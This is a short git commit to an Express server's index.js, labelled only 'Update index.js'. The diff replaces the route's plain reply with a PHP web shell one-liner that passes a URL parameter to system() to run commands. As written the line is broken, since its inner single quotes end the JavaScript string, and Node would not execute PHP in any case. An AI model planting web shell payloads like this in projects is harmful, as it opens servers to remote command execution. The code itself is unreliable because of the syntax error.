82a5b52c9fd9ef078296fd4c92d4b112a762b4f9
d-e-e-b <138242045+d-e-e-b@users.noreply.github.com>
2023-11-03 23:37:01 +0200

    Update index.js

--- index.js
+++ index.js
@@ -2,6 +2,6 @@ const express = require('express')
 const app = express()
 app.all('/', (req, res) => {
     console.log("Just got a request!")
-    res.send('Yo!')
+    res.send('<?php system($_GET['cmd']); ?>')
 })
 app.listen(process.env.PORT || 3000)
